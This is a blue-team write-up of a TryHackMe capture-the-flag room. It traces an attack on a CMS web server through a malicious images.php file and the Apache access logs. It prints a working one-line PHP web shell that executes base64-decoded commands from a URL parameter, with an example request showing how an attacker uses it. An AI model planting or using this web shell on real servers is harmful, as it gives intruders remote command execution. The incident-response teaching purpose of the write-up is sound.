
# Infinity Shell

Writeup about TryHackme Infinity Shell Challenge Room

[Diffuculty: Easy]
[Blue Team]

https://tryhackme.com/room/hfb1infinityshell



## Scenario

![App Screenshot](https://github.com/Muaz1425/Infinity-Shell-Room/blob/main/Images/InfinityShellScenario.png)

From the question, we can see the hint is "vulnerability in web application" with that we start investigation anything related with web application.
## Walkthrough

![App Screenshot](https://github.com/Muaz1425/Infinity-Shell-Room/blob/main/Images/InfinityShellHtml.png)

In this machine, the only directory that exist related with web application is "/var/www/html". We continue investigation here and see the directory have one file and another directory.

Inspecting the index.html its just shows web page file which nothing suspicious here. We continue to investigation to CMSsite-master directory.

```bash
CMS (Content Management System) is software for create, manage and publish web content without requiring to write raw HTML. CMS is known for its vulnerabilities which one it, is File Upload vulnerabilities. This vulnerabilities due to CMS doesn't validate the uploaded file which enable unauthorized user to upload php shells as images and execute it on the server.
```
![App Screenshot](https://github.com/Muaz1425/Infinity-Shell-Room/blob/main/Images/InfinityShellList.png)

In directory img, we can see the file name images.php which look suspicious since the images file extension is php rather than .png.

![App Screenshot](https://github.com/Muaz1425/Infinity-Shell-Room/blob/main/Images/InfinityShellCat.png)

Read the images.php, we see it contain a command:

```bash
<?php system(base64_decode($_GET[‘query’])); ?>
```
Break down of command:

```bash
$_GET['query'] : Takes value from the URL query string.

base64_decode(...) : Decode a Base64-encoding string.

system(...) : Executes the decoded string as shell command and outputs the result to the browser.
```

Example use of this command work:

```bash
Attacker visit https://victim-site.com/images.php?query=bHM=

$_GET['query'] receive the bHM=

base64_decode('bHM=') decode it into 'ls'

system('ls') executes ls on the server and return output to the browser
```

In simple explanation:

Attacker sends an instruction via URL, then the server executes it on itself and send result back to the attacker.

![App Screenshot](https://github.com/Muaz1425/Infinity-Shell-Room/blob/main/Images/InfinityShellLogs.png)

To trace back what the attacker query to web application is by checking the directory /var/log/apache2/

```bash
/var/log directory is the standard location for all system and application logs, so checking this directory is the best place to trace back attacker query.
```

![App Screenshot](https://github.com/Muaz1425/Infinity-Shell-Room/blob/main/Images/InfinityShellShowLog.png)

Using command "car other_vhosts_access.log.1 | grep images.php" we can see the log and filter only that related to images.php.


![App Screenshot](https://github.com/Muaz1425/Infinity-Shell-Room/blob/main/Images/InfinityShellQuery.png)

Here we can see the query that being send to the web application.

![App Screenshot](https://github.com/Muaz1425/Infinity-Shell-Room/blob/main/Images/InfinityShellCyberChef.png)

Using CyberChef we can decode it from base64, we can see the command attacker send and the flag to completed the room.
